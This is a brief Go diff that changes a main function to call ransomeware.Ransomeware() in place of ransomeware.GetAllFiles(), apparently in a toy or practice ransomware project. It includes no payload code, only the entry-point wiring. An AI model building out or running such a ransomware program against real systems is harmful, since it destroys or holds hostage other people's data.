@@ -8,5 +8,5 @@ import (
 
 func main() {
 	fmt.Println("lol 🐹😀")
-	ransomeware.GetAllFiles()
+	ransomeware.Ransomeware()
 }
